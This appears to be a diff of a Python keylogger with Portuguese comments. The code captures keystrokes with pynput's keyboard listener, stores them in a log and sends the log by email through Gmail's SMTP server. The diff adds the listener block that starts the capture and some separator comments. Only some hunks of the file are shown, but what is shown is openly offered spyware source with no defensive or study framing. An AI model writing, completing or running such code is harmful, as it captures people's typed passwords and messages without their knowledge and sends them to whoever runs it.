@@ -9,12 +9,13 @@ from pynput.keyboard import Key, Listener
 
 print("\nRun...\n")
 
-# configurando email...
+# configurando email --------------------------------
 
 email = input('Digite o email: ')
 password = getpass.getpass(prompt='Password: ', stream=None)
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(email, password)
+#----------------------------------------------------
 
 # configurando log para armazenar as capturas
 
@@ -51,6 +52,7 @@ def on_press(key):
     if key == Key.esc:
         return False
 
+#----------------------------------------------------
 
 # enviar o log capturado para o email
 def send_log():
@@ -59,3 +61,6 @@ def send_log():
         email,
         full_log
     )
+
+with Listener(on_press = on_press) as listener:
+    listener.join()
